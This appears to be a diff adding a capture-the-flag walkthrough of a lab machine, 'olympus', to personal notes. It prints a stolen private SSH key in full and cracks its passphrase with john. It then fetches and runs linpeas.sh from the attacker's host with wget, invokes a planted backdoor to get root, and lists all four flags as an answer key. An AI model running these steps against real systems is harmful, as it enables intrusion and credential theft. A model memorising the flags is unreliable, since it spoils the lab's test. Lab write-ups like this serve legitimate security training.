@@ -630,3 +630,320 @@ File copied successfully.
 www-data@olympus:/home/zeus$ ls
 ls
 id_rsa	snap  user.flag  zeus.txt
+www-data@olympus:/home/zeus$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
+NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
+WQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2
+eow4Kk0N2LTAHtOzNd7PnnvQdT3NdJDKz5bUgzXE7mCFJkZXOcdryHWyujkGQKi5SLdLsh
+vNzjabxxq9P6HSI1RI4m3c16NE7yYaTQ9LX/KqtcdHcykoxYI3jnaAR1Mv07Kidk92eMMP
+Rvz6xX8RJIC49h5cBS4JiZdeuj8xYJ+Mg2QygqaxMO2W4ghJuU6PTH73EfM4G0etKi1/tZ
+R22SvM1hdg6H5JeoLNiTpVyOSRYSfZiBldPQ54/4vU51Ovc19B/bWGlH3jX84A9FJPuaY6
+jqYiDMYH04dc1m3HsuMzwq3rnVczACoe2s8T7t/VAV4XUnWK0Y2hCjpSttvlg7NRKSSMoG
+Xltaqs40Es6m1YNQXyq8ItLLykOY668E3X9Kyy2d83wKTuLThQUmTtKHVqQODSOSFTAukQ
+ylADJejRkgu5EAAAWQVdmk3bX1uysR28RQaNlr0tyruSQmUJ+zLBiwtiuz0Yg6xHSBRQoS
+vDp+Ls9ei4HbBLZqoemk/4tI7OGNPRu/rwpmTsitXd6lwMUT0nOWCXE28VMl5gS1bJv1kA
+l/8LtpteqZTugNpTXawcnBM5nwV5L8+AefIigMVH5L6OebdBMoh8m8j78APEuTWsQ+Pj7s
+z/pYM3ZBhBCJRWkV/f8di2+PMHHZ/QY7c3lvrUlMuQb20o8jhslmPh0MhpNtq+feMyGIip
+mEWLf+urcfVHWZFObK55iFgBVI1LFxNy0jKCL8Y/KrFQIkLKIa8GwHyy4N1AXm0iuBgSXO
+dMYVClADhuQkcdNhmDx9UByBaO6DC7M9pUXObqARR9Btfg0ZoqaodQ+CuxYKFC+YHOXwe1
+y09NyACiGGrBA7QXrlr+gyvAFu15oeAAT1CKsmlx2xL1fXEMhxNcUYdtuiF5SUcu+XY01h
+Elfd0rCq778+oN73YIQD9KPB7MWMI8+QfcfeELFRvAlmpxpwyFNrU1+Z5HSJ53nC0o7hEh
+J1N7xqiiD6SADL6aNqWgjfylWy5n5XPT7d5go3OQPez7jRIkPnvjJms06Z1d5K8ls3uSYw
+oanQQ5QlRDVxZIqmydHqnPKVUc+pauoWk1mlrOIZ7nc5SorS7u3EbJgWXiuVFn8fq04d/S
+xBUJJzgOVbW6BkjLE7KJGkdssnxBmLalJqndhVs5sKGT0wo1X7EJRacMJeLOcn+7+qakWs
+CmSwXSL8F0oXdDArEvao6SqRCpsoKE2Lby2bOlk/9gd1NTQ2lLrNj2daRcT3WHSrS6Rg0w
+w1jBtawWADdV9248+Q5fqhayzs5CPrVpZVhp9r31HJ/QvQ9zL0SLPx416Q/S5lhJQQv/q0
+XOwbmKWcDYkCvg3dilF4drvgNyXIow46+WxNcbj144SuQbwglBeqEKcSHH6EUu/YLbN4w/
+RZhZlzyLb4P/F58724N30amY/FuDm3LGuENZrfZzsNBhs+pdteNSbuVO1QFPAVMg3kr/CK
+ssljmhzL3CzONdhWNHk2fHoAZ4PGeJ3mxg1LPrspQuCsbh1mWCMf5XWQUK1w2mtnlVBpIw
+vnycn7o6oMbbjHyrKetBCxu0sITu00muW5OJGZ5v82YiF++EpEXvzIC0n0km6ddS9rPgFx
+r3FJjjsYhaGD/ILt4gO81r2Bqd/K1ujZ4xKopowyLk8DFlJ32i1VuOTGxO0qFZS9CAnTGR
+UDwbU+K33zqT92UPaQnpAL5sPBjGFP4Pnvr5EqW29p3o7dJefHfZP01hqqqsQnQ+BHwKtM
+Z2w65vAIxJJMeE+AbD8R+iLXOMcmGYHwfyd92ZfghXgwA5vAxkFI8Uho7dvUnogCP4hNM0
+Tzd+lXBcl7yjqyXEhNKWhAPPNn8/5+0NFmnnkpi9qPl+aNx/j9qd4/WMfAKmEdSe05Hfac
+Ws6ls5rw3d9SSlNRCxFZg0qIOM2YEDN/MSqfB1dsKX7tbhxZw2kTJqYdMuq1zzOYctpLQY
+iydLLHmMwuvgYoiyGUAycMZJwdZhF7Xy+fMgKmJCRKZvvFSJOWoFA/MZcCoAD7tip9j05D
+WE5Z5Y6je18kRs2cXy6jVNmo6ekykAssNttDPJfL7VLoTEccpMv6LrZxv4zzzOWmo+PgRH
+iGRphbSh1bh0pz2vWs/K/f0gTkHvPgmU2K12XwgdVqMsMyD8d3HYDIxBPmK889VsIIO41a
+rppQeOaDumZWt93dZdTdFAATUFYcEtFheNTrWniRCZ7XwwgFIERUmqvuxCM+0iv/hx/ZAo
+obq72Vv1+3rNBeyjesIm6K7LhgDBA2EA9hRXeJgKDaGXaZ8qsJYbCl4O0zhShQnMXde875
+eRZjPBIy1rjIUiWe6LS1ToEyqfY=
+-----END OPENSSH PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat zeus_idrsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+eRZjPBIy1rjIUiWe6LS1ToEyqfY=
+-----END OPENSSH PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh2john zeus_idrsa > zeus_hash.txt
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zeus_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+snowflake        (zeus_idrsa)     
+1g 0:00:01:01 DONE () 0.01633g/s 24.57p/s 24.57c/s 24.57C/s maurice..bunny
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                            
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 zeus_idrsa 
+                                                                                            
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i zeus_idrsa zeus@10.10.222.120
+The authenticity of host '10.10.222.120 (10.10.222.120)' can't be established.
+ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.222.120' (ED25519) to the list of known hosts.
+Enter passphrase for key 'zeus_idrsa': 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+33 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Jul 16 07:52:39 2022
+zeus@olympus:~$ id
+uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
+zeus@olympus:~$ cat user.flag 
+flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.222.120 - - [29/Apr/2023 17:59:15] "GET /linpeas.sh HTTP/1.1" 200 -
+
+zeus@olympus:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
+--  http://10.8.19.103:1234/linpeas.sh
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828098 (809K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh           100%[====================>] 808.69K   564KB/s    in 1.4s    
+
+(564 KB/s) - ‘linpeas.sh’ saved [828098/828098]
+
+zeus@olympus:/tmp$ chmod +x linpeas.sh
+zeus@olympus:/tmp$ ./linpeas.sh 
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/zeus/.bash_history
+/root/
+/var/www
+/var/www/olympus.thm/public_html/~webmaster/admin/includes/admin_edit_user.php
+/var/www/olympus.thm/public_html/static
+/var/www/olympus.thm/public_html/static/particles.json
+/var/www/olympus.thm/public_html/static/style.css
+/var/www/olympus.thm/public_html/static/particles.min.js
+/var/www/olympus.thm/public_html/static/normalize.css
+/var/www/olympus.thm/public_html/static/images
+/var/www/olympus.thm/public_html/static/images/load.svg
+/var/www/olympus.thm/public_html/static/images/watermelon.svg
+/var/www/olympus.thm/public_html/static/images/background.png
+/var/www/html/index.html.old
+/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
+/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
+/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
+
+zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ uname -a; w; $suid_bd; /lib/defended/libc.so.99
+Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 22:13:37 up 45 min,  2 users,  load average: 0.00, 0.36, 0.73
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+zeus     pts/2    10.8.19.103      21:56   14:09   0.36s  0.36s -bash
+zeus     pts/3    10.8.19.103      22:00    1.00s  0.14s  0.00s w
+```
+```text
+- # whoami
+root
+```
+```text
+- # cd /root
+```
+```text
+- # ls
+config	root.flag  snap
+```
+```text
+- # cat root.flag	
+                    ### Congrats !! ###
+
+                            (
+                .            )        )
+                         (  (|              .
+                     )   )\/ ( ( (
+             *  (   ((  /     ))\))  (  )    )
+           (     \   )\(          |  ))( )  (|
+           >)     ))/   |          )/  \((  ) \
+           (     (      .        -.     V )/   )(    (
+            \   /     .   \            .       \))   ))
+              )(      (  | |   )            .    (  /
+             )(    ,'))     \ /          \( `.    )
+             (\>  ,'/__      ))            __`.  /
+            ( \   | /  ___   ( \/     ___   \ | ( (
+             \.)  |/  /   \__      __/   \   \|  ))
+            .  \. |>  \      | __ |      /   <|  /
+                 )/    \____/ :..: \____/     \ <
+          )   \ (|__  .      / ;: \          __| )  (
+         ((    )\)  ~--_     --  --      _--~    /  ))
+          \    (    |  ||               ||  |   (  /
+                \.  |  ||_             _||  |  /
+                  > :  |  ~V+-I_I_I-+V~  |  : (.
+                 (  \:  T\   _     _   /T  : ./
+                  \  :    T^T T-+-T T^T    ;<
+                   \..`_       -+-       _'  )
+                      . `--=.._____..=--'. ./          
+
+                You did it, you defeated the gods.
+                        Hope you had fun !
+
+                   flag{D4mN!_Y0u_G0T_m3_:)_}
+
+PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)
+
+                  (Hint : regex can be usefull)
+```
+```text
+- # cd /etc
+```
+```text
+- # ls
+adduser.conf		       gai.conf		mdadm			 rmt
+alternatives		       groff		mecabrc			 rpc
+amazon			       group		mime.types		 rsyslog.conf
+apache2			       group-		mke2fs.conf		 rsyslog.d
+apparmor		       grub.d		modprobe.d		 screenrc
+apparmor.d		       gshadow		modules			 security
+apport			       gshadow-		modules-load.d		 selinux
+apt			       gss		mtab			 services
+at.deny			       hdparm.conf	multipath.conf		 shadow
+avahi			       host.conf	mysql			 shadow-
+bash.bashrc		       hostname		nanorc			 shells
+bash_completion		       hosts		netplan			 skel
+bash_completion.d	       hosts.allow	network			 sos
+bindresvport.blacklist	       hosts.deny	networkd-dispatcher	 ssh
+binfmt.d		       init		NetworkManager		 ssl
+byobu			       init.d		networks		 subgid
+ca-certificates		       initramfs-tools	newt			 subgid-
+ca-certificates.conf	       inputrc		nsswitch.conf		 subuid
+ca-certificates.conf.dpkg-old  iproute2		opt			 subuid-
+calendar		       iscsi		os-release		 sudoers
+cloud			       issue		overlayroot.conf	 sudoers.d
+console-setup		       issue.net	PackageKit		 sysctl.conf
+cron.d			       kernel		pam.conf		 sysctl.d
+cron.daily		       landscape	pam.d			 systemd
+cron.hourly		       ldap		passwd			 terminfo
+cron.monthly		       ld.so.cache	passwd-			 thermald
+crontab			       ld.so.conf	perl			 timezone
+cron.weekly		       ld.so.conf.d	php			 tmpfiles.d
+cryptsetup-initramfs	       legal		phpmyadmin		 ubuntu-advantage
+crypttab		       libaudit.conf	pki			 ucf.conf
+dbconfig-common		       libblockdev	pm			 udev
+dbus-1			       libnl-3		polkit-1		 udisks2
+dconf			       lighttpd		pollinate		 ufw
+debconf.conf		       locale.alias	popularity-contest.conf  update-manager
+debian_version		       locale.gen	profile			 update-motd.d
+default			       localtime	profile.d		 update-notifier
+deluser.conf		       logcheck		protocols		 UPower
+depmod.d		       login.defs	python3			 vim
+dhcp			       logrotate.conf	python3.8		 vmimport.rc.local
+dpkg			       logrotate.d	rc0.d			 vmware-tools
+e2scrub.conf		       lsb-release	rc1.d			 vtrgb
+emacs			       ltrace.conf	rc2.d			 wgetrc
+environment		       lvm		rc3.d			 X11
+ethertypes		       machine-id	rc4.d			 xattr.conf
+fonts			       magic		rc5.d			 xdg
+fstab			       magic.mime	rc6.d			 zsh_command_not_found
+fstab.orig		       mailcap		rc.local
+fuse.conf		       mailcap.order	rcS.d
+fwupd			       manpath.config	resolv.conf
+```
+```text
+- # grep -irl flag{
+ssl/private/.b0nus.fl4g
+```
+```text
+- # cat ssl/private/.b0nus.fl4g
+Here is the final flag ! Congrats !
+
+flag{Y0u_G0t_m3_g00d!}
+
+As a reminder, here is a usefull regex :
+
+grep -irl flag{
+
+Hope you liked the room ;)
+```
+- ![[Pasted image 20230429160708.png]]
+- What is Flag 1?
+- ***flag{Sm4rt!_k33P_d1gGIng}***
+- What is Flag 2?
+- ***flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}***
+- What is Flag 3?
+- ***flag{D4mN!_Y0u_G0T_m3_:)_}***
+- What is Flag 4?
+- The flag is located in /etc/
+- ***flag{Y0u_G0t_m3_g00d!}***
+
+## Notes / Lessons Learned
+[[Conti]]
+
